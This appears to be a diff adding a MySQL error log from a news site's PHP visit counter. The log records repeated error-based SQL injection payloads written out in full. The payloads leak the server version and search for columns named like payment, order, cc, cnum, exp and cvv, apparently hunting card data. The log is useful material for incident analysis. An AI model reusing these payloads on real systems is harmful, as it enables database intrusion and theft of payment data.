@@ -1,0 +1,87 @@
+Time : 20:32:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select(select concat(char(33,126,33),count(t.table_name),char(33,126,33)) from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and c.column_name like 0x257061796d656e7425)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 20:32:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select(select concat(char(33,126,33),count(t.table_name),char(33,126,33)) from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and c.column_name like 0x2573616c6525)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 20:32:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select(select concat(char(33,126,33),count(t.table_name),char(33,126,33)) from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and c.column_name like 0x256f7264657225)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 20:32:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 20:32:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 20:10:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 19:12:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 17:17:51
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select(select concat(char(33,126,33),count(t.table_name),char(33,126,33)) from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and c.column_name like 0x2565787025)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 17:17:46
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 17:17:44
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 16:56:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select(select concat(char(33,126,33),count(t.table_name),char(33,126,33)) from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and c.column_name like 0x2543435625)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 16:56:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 16:56:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 12:01:01
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select(select concat(char(33,126,33),count(t.table_name),char(33,126,33)) from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and c.column_name like 0x25636325)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 12:00:57
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 12:00:55
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 11:09:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select(select concat(char(33,126,33),count(t.table_name),char(33,126,33)) from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and c.column_name like 0x25636e756d25)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 11:09:07
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 11:09:05
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 10:28:11
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select(select concat(char(33,126,33),count(t.table_name),char(33,126,33)) from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and c.column_name like 0x2563767625)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 10:28:07
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+Time : 10:28:05
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select 1 from(select count(*),concat((select(select concat(char(33,126,33),version(),char(33,126,33))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
